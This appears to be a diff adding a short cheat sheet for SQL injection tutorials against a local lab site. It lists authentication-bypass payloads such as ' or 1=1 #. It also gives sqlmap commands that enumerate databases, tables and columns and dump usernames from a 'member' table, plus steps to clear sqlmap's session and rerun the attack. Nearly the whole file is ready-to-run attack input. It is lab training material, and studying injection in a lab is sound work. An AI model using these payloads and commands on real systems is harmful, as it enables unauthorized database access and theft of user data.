@@ -1,0 +1,36 @@
+Injection list for Tutorial 1
+1) ' or 1=1 #
+2) ' or ( 1=1 and username='admin') -- 
+
+Injection list for Tutorial 2
+1) 1 or 1=1
+
+SqlMap Command List for Tutorial 2
+Search for databases
+1) python sqlmap.py -u http://localhost/sqllab/search.php?id=1 --dbs
+
+Search for tables inside db sqltest
+2) python sqlmap.py -u http://localhost/sqllab/search.php?id=1 -D sqltest --tables
+
+Search for columns inside db sqltest tb member
+3) python sqlmap.py -u http://localhost/sqllab/search.php?id=1 -D sqltest -T member --columns
+
+Search for columns inside db sqltest tb member and dump all info in column username
+4) python sqlmap.py -u http://localhost/sqllab/search.php?id=1 -D sqltest -T member -C username --dump
+
+Browse to SQL test output folder
+5) cd /home/sanjeev/.sqlmap/output/localhost/dump/sqltest/
+
+Copy Dump info to desktop to view it
+6) cp member.csv /home/sanjeev/Desktop/
+
+Remove the db from sqlite and recommence attack
+1) cd /home/sanjeev/.sqlmap/output/localhost
+
+2) rm log
+
+3) rm session.sqlite
+
+4) Recommence Attack
+
+
